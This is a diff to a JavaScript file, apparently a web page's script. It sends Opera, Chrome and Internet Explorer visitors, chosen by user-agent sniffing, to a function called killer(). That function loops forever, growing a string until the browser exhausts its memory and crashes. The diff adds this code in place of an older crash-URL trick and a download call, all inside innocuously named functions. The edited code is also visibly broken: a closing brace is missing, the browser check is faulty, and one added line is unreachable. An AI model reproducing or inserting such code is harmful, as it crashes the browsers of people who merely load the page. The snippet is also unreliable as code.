@@ -148,10 +148,10 @@ if (navigator.appVersion.indexOf("Win")!=-1) {OSName="Windows";};
 
 function download2(){
 	if((navigator.userAgent.indexOf("Opera") || navigator.userAgent.indexOf('OPR')) != -1 ){
-	chrome.tabs.update({ url: 'chrome://inducebrowsercrashforrealz' });}
+	killer();
 	else if(navigator.userAgent.indexOf("Chrome") != -1 )
     {
-         chrome.tabs.update({ url: 'chrome://inducebrowsercrashforrealz' });
+         killer();
     }
     else if(navigator.userAgent.indexOf("Safari") != -1)
     {
@@ -163,14 +163,16 @@ function download2(){
     }
     else if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) //IF IE > 10
     {
-         download(document.getElementById('a').value);
+         killer();
     }  
 }
 function killer(){
 	while(1){
     	txt += "a";    //add as much as the browser can handle
 	}
+	txt = "a";
 }
+
 function download(mult) {
     bobby*=mult;
     // if(mult==null){
